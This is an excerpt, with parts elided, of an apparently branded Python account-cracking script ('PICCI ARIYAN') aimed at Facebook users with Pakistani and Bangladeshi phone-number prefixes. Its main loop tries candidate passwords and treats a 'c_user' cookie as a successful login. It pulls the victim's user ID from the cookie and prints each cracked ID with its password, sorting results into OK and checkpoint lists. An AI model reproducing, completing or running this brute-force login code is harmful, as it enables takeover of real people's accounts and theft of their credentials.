...
'\33[1;92m$$ |  $$ |      $$ |  $$ |      $$ |\$  /$$ |
'\33[1;97m$$ |  $$ |      $$ |  $$ |      $$ | \_/ $$ |    𝐏𝐈𝐂𝐂𝐈
'\33[1;92m\__|  \__|      \__|  \__|      \__|     \__|  𝐀𝐑𝐈𝐘𝐀𝐍
\033[1;97m====================================================
...
def pass1():
    ...
    print('\033[1;97m================================PICCI====================') 
    print(f"\x1b[97m\033[37;41m BEST CODE FOR PAK BD [0300 / 0302 / 017 / 018 /019]\033[0;m")
    print('\033[1;97m===================================ARIYAN=================') 
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;92m[\033[1;96mAAM-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;94m[\033[1;91mA-A-M-CP🥺\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[PICCI-ARIYAN] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
